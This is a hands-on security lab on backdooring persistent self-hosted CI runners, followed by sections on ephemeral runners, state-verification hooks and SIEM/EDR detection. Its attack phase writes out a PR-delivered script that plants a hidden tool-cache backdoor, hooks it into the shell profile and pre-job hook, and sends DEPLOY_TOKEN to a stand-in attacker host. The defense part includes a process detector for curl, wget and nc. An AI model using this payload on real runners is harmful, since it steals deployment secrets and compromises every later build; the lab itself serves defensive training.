# Lab 2.5: Self-Hosted Runner Attacks

<div class="lab-meta">
  <span>~40 minutes</span>
  <span>Advanced</span>
  <span>Prerequisites: <a href="2.1-cicd-fundamentals.md">Lab 2.1</a></span>
</div>

In March 2021, researchers demonstrated that GitHub Actions self-hosted runners retain state between workflow runs -- including files, environment variables, credentials, and even running processes. Unlike GitHub-hosted runners, which are fresh VMs destroyed after each job, self-hosted runners are persistent machines. An attacker who gets code execution on a self-hosted runner (via a PR, a compromised dependency, or a malicious Action) can plant backdoors that survive across builds and affect every subsequent workflow that runs on that machine.

Major open-source projects including PyTorch and Kubernetes have been impacted by self-hosted runner misconfigurations that allowed untrusted PRs to execute code on persistent infrastructure.

In this lab, you will exploit a self-hosted runner's persistent state to plant a backdoor that executes on the next build, then defend against it with ephemeral runners and state verification.

!!! info "Phase 1: UNDERSTAND -- Runners Retain State"

    **Goal:** Understand how self-hosted runners differ from ephemeral runners and why persistent state is dangerous.

### Step 1: Examine the runner's filesystem

```bash
# Check the runner's work directory -- this persists between jobs
ls -la /runner/_work/

# Previous build artifacts, caches, and tool installations remain
find /runner/_work/ -type f -name "*.log" 2>/dev/null
```

Unlike GitHub-hosted runners that boot from a clean VM image, self-hosted runners keep their `_work` directory, tool cache, and any files written outside the workspace.

### Step 2: Check what persists between jobs

```bash
# These all survive between workflow runs:
echo "--- Tool cache ---"
ls -la /runner/_work/_tool/

echo "--- Runner environment ---"
cat /runner/.env

echo "--- Cron jobs ---"
crontab -l 2>/dev/null

echo "--- Running processes ---"
ps aux | grep -v grep
```

The runner is a long-lived machine. Anything you install, write, or schedule persists until someone explicitly cleans it up.

### Step 3: Review the workflow configuration

```bash
cd /repos/acme-webapp
cat .gitea/workflows/ci.yml
```

The workflow uses `runs-on: self-hosted` and triggers on `pull_request`. This means any PR author gets code execution on the persistent runner.

### Step 4: Understand the attack surface

A self-hosted runner that processes untrusted PRs gives attackers:

1. **Persistent filesystem access** -- write files that survive across builds
2. **Credential theft** -- steal tokens, SSH keys, cloud credentials stored on the machine
3. **Lateral movement** -- the runner often has network access to internal infrastructure
4. **Supply chain persistence** -- modify build tools so every future build is compromised

!!! warning "Phase 2: BREAK -- Backdoor Persistence"

    **Goal:** Plant a backdoor on the self-hosted runner that executes on every subsequent build.

### Step 1: Create an attack branch

```bash
cd /repos/acme-webapp
git checkout -b feature/update-tests
```

### Step 2: Inject a persistent backdoor via a PR

```bash
cat > test_helper.sh << 'PAYLOAD'
#!/bin/bash
# Innocent-looking test helper script in the PR

echo "Setting up test environment..."

# === PERSISTENCE MECHANISM ===
# Backdoor the runner's tool cache with a hidden script
mkdir -p /runner/_work/_tool/.hidden
cat > /runner/_work/_tool/.hidden/backdoor.sh << 'INNER'
#!/bin/bash
# Runs on every build -- exfiltrate secrets
if [ -n "$DEPLOY_TOKEN" ]; then
  curl -sf "http://attacker.internal/collect?token=$DEPLOY_TOKEN&repo=$GITHUB_REPOSITORY" || true
fi
INNER
chmod +x /runner/_work/_tool/.hidden/backdoor.sh

# Hook into the runner's shell profile so it runs on every job
echo '/runner/_work/_tool/.hidden/backdoor.sh 2>/dev/null &' >> /runner/.bash_profile

# Alternative: modify the runner's pre-job hook
if [ -d /runner/hooks ]; then
  cp /runner/_work/_tool/.hidden/backdoor.sh /runner/hooks/pre-run.sh
fi

echo "Test environment ready."
PAYLOAD

chmod +x test_helper.sh
```

### Step 3: Add the payload to the workflow

```bash
cat > .gitea/workflows/ci.yml << 'EOF'
name: ACME Webapp CI

on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - name: Setup test environment
        run: bash test_helper.sh
      - name: Run tests
        run: python test_app.py
EOF
```

### Step 4: Submit the PR

```bash
git add -A
git commit -m "Update test framework setup"
git push origin feature/update-tests

curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/acme-webapp/pulls" \
  -H "Content-Type: application/json" \
  -u "attacker:password" \
  -d '{"title":"Update test framework setup","base":"main","head":"feature/update-tests"}'
```

### Step 5: Verify the backdoor persists

After the PR workflow runs, the backdoor is planted. Now every subsequent build on this runner will:

```bash
# Verify the backdoor survived the job
ls -la /runner/_work/_tool/.hidden/
cat /runner/.bash_profile | grep backdoor

# The NEXT build (from ANY repo using this runner) will trigger the backdoor
# Even if the PR is closed without merging
```

The attack is devastating because:

- **The PR does not need to be merged** -- CI runs the attacker's code before review
- **The backdoor survives** -- it persists in the runner's filesystem indefinitely
- **Cross-repo impact** -- if the runner serves multiple repos, all are compromised
- **Stealth** -- the backdoor runs silently alongside legitimate builds

!!! success "Phase 3: DEFEND -- Ephemeral Runners and Isolation"

    **Goal:** Eliminate persistent state to prevent runner backdoors.

### Fix 1: Use ephemeral (just-in-time) runners

```bash
cd /repos/acme-webapp
git checkout main
```

Configure the runner for ephemeral mode -- it processes one job then exits:

```bash
# Runner configuration with --ephemeral flag
cat > /runner/config.yaml << 'EOF'
# Runner configured for ephemeral mode
# Each job gets a fresh runner instance
ephemeral: true
replace_existing: true

# Container-based isolation -- each job runs in a fresh container
container:
  image: "ubuntu:22.04"
  options: "--rm --network=none"
  workdir: "/workspace"
EOF
```

### Fix 2: Apply workflow hardening

```bash
cat > .gitea/workflows/ci.yml << 'EOF'
name: ACME Webapp CI

on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: self-hosted
    container:
      image: node:20-slim
      options: --rm --read-only --tmpfs /tmp
    steps:
      - uses: actions/checkout@v4
      - name: Run tests
        run: python test_app.py

  # Separate job for PRs -- no self-hosted runner
  pr-test:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest  # Use ephemeral GitHub-hosted runner for PRs
    steps:
      - uses: actions/checkout@v4
      - name: Run tests
        run: python test_app.py
EOF
```

### Fix 3: Add state verification between jobs

```bash
cat > /runner/hooks/pre-run.sh << 'CHECKEOF'
#!/bin/bash
# Pre-job hook: verify runner state integrity

EXPECTED_HASH="$(cat /runner/.state-hash 2>/dev/null)"
CURRENT_HASH="$(find /runner/_work/_tool -type f -exec sha256sum {} \; | sort | sha256sum | cut -d' ' -f1)"

if [ "$EXPECTED_HASH" != "$CURRENT_HASH" ]; then
  echo "::error::Runner state has been tampered with!"
  echo "Expected: $EXPECTED_HASH"
  echo "Current:  $CURRENT_HASH"
  exit 1
fi

# Check for unexpected cron jobs
if crontab -l 2>/dev/null | grep -v '^#' | grep -q .; then
  echo "::error::Unexpected cron jobs detected on runner!"
  crontab -l
  exit 1
fi

# Check for unexpected processes
SUSPICIOUS=$(ps aux | grep -E '(curl|wget|nc|ncat)' | grep -v grep)
if [ -n "$SUSPICIOUS" ]; then
  echo "::error::Suspicious processes detected on runner!"
  echo "$SUSPICIOUS"
  exit 1
fi
CHECKEOF

chmod +x /runner/hooks/pre-run.sh
```

### Fix 4: Commit and push

```bash
git add -A
git commit -m "Harden runner: ephemeral mode, container isolation, state verification"
git push origin main
```

### Key defenses summary

1. **Ephemeral runners** (`--ephemeral` / `--jit`) -- runner exits after one job, no persistence
2. **Container isolation** -- each job runs in a disposable container with `--rm`
3. **Never run untrusted PRs on self-hosted runners** -- use GitHub-hosted for PR workflows
4. **State verification hooks** -- hash the tool cache and check for tampering before each job
5. **Read-only filesystems** -- mount the runner's filesystem as read-only where possible
6. **Network isolation** -- restrict runner network access to only required endpoints

!!! danger "Phase 4: DETECT -- Catching Runner Persistence"

    **Goal:** Detect when an attacker plants persistence mechanisms on a self-hosted runner.

### SIEM / Log Indicators

Self-hosted runner attacks leave traces in both the runner's filesystem and CI audit logs. The key signal is **filesystem modifications outside the workspace directory during a PR build**.

**What to look for:**

- Files written to `/runner/_work/_tool/`, `/runner/hooks/`, or runner home directories during PR jobs
- New cron jobs, systemd services, or shell profile modifications on runner machines
- Outbound network connections from the runner to unexpected destinations between jobs
- Process trees showing child processes that outlive the workflow job
- Runner tool cache hash changes between jobs

### Example Detection Queries

**Splunk -- detect runner filesystem persistence:**

```spl
index=cicd sourcetype=runner_audit
| where action IN ("file_create", "file_modify")
  AND NOT match(file_path, "^/runner/_work/[^/]+/[^/]+/")
| where trigger_type="pull_request"
| table _time, runner_name, file_path, action, workflow_name, pr_author
| sort -_time
```

**Splunk -- detect processes surviving between jobs:**

```spl
index=endpoint sourcetype=sysmon host=runner-*
| where EventCode=1
| stats earliest(_time) as first_seen, latest(_time) as last_seen by Image, CommandLine
| where last_seen - first_seen > 3600
| where NOT match(Image, "(actions-runner|Runner\.Listener|Runner\.Worker)")
| table Image, CommandLine, first_seen, last_seen
```

**KQL -- detect runner state tampering:**

```kql
DeviceFileEvents
| where DeviceName startswith "runner-"
| where FolderPath has_any ("_tool/.hidden", "/hooks/", ".bash_profile", ".bashrc", "crontab")
| where ActionType in ("FileCreated", "FileModified")
| join kind=inner (
    CIBuildEvents | where TriggerType == "pull_request"
) on $left.DeviceId == $right.RunnerId
| project Timestamp, FileName, FolderPath, ActionType, Repository, PRAuthor
```

### EDR Indicators

| Indicator | Type | Description |
|-----------|------|-------------|
| Files in `/runner/_work/_tool/.hidden/` | File | Hidden persistence directory in tool cache |
| Modified `/runner/.bash_profile` | File | Shell profile backdoor |
| New entries in `crontab` | Persistence | Scheduled task persistence |
| Processes surviving job completion | Process | Orphaned malicious processes |
| Outbound connections between jobs | Network | C2 or exfiltration from idle runner |

!!! tip "SOC Relevance"

    **Alerts you will see:**

    - "Runner filesystem modified outside workspace during PR build" (runner audit)
    - "New cron job detected on CI runner" (endpoint monitoring)
    - "Process survived workflow job completion on runner" (EDR)
    - "Runner state hash mismatch before job start" (pre-job hook)

    **Why this matters to your SOC:** Self-hosted runner attacks are a growing concern as organizations adopt GitHub Actions and GitLab CI at scale. Unlike cloud-hosted runners, self-hosted runners are your infrastructure -- a compromised runner is a foothold in your network. The persistence aspect makes this particularly dangerous: a single malicious PR can compromise every future build.

    **Triage workflow:**

    1. **Check what was written** -- inspect all files created or modified outside the workspace during the suspect job
    2. **Check for persistence mechanisms** -- cron jobs, shell profiles, systemd services, startup scripts
    3. **Check process tree** -- are there processes that outlived the workflow job?
    4. **Identify the trigger** -- which PR or workflow run planted the persistence?
    5. **If confirmed: quarantine the runner immediately** -- take it offline, image the disk for forensics
    6. **Rebuild from scratch** -- never trust a compromised runner, reprovision it
    7. **Audit all builds** -- every build that ran on the compromised runner after the attack must be treated as potentially tainted

    **False positive rate:** Low. Filesystem modifications outside the workspace directory during PR builds are inherently suspicious. Legitimate tools should only write to the workspace and designated cache directories.

!!! example "CI Integration"

    **`.github/workflows/runner-integrity.yml`:**

    ```yaml
    name: Runner Integrity Check

    on:
      workflow_run:
        workflows: ["*"]
        types: [completed]

    jobs:
      verify-runner-state:
        runs-on: self-hosted
        steps:
          - name: Check for persistence mechanisms
            run: |
              echo "--- Checking for unexpected files ---"
              SUSPICIOUS=$(find /runner/_work/_tool -name "*.sh" \
                -newer /runner/.last-verified 2>/dev/null)
              if [ -n "$SUSPICIOUS" ]; then
                echo "::error::New scripts found in tool cache:"
                echo "$SUSPICIOUS"
                exit 1
              fi

              echo "--- Checking crontab ---"
              if crontab -l 2>/dev/null | grep -v '^#' | grep -q .; then
                echo "::error::Unexpected cron jobs found"
                crontab -l
                exit 1
              fi

              echo "--- Checking shell profiles ---"
              for f in ~/.bash_profile ~/.bashrc ~/.profile; do
                if [ -f "$f" ]; then
                  HASH=$(sha256sum "$f" | cut -d' ' -f1)
                  EXPECTED=$(cat "/runner/.baseline/$(basename $f).hash" 2>/dev/null)
                  if [ "$HASH" != "$EXPECTED" ]; then
                    echo "::error::Shell profile $f has been modified"
                    diff "/runner/.baseline/$(basename $f)" "$f" || true
                    exit 1
                  fi
                fi
              done

              touch /runner/.last-verified
              echo "Runner state verified clean."
    ```

## What You Learned

1. **Self-hosted runners retain state** -- files, tools, cron jobs, and processes persist between workflow runs.
2. **PR builds on self-hosted runners are dangerous** -- any PR author gets code execution on your infrastructure.
3. **Persistence is trivial** -- a single PR can plant backdoors in shell profiles, cron jobs, or the tool cache.
4. **Cross-repo impact** -- a compromised runner affects every repository that uses it.
5. **Ephemeral runners eliminate persistence** -- use `--ephemeral` mode or container isolation so each job starts clean.
6. **Never run untrusted code on self-hosted runners** -- route PR builds to ephemeral GitHub-hosted runners.
7. **State verification catches tampering** -- hash the runner's baseline state and check it before each job.
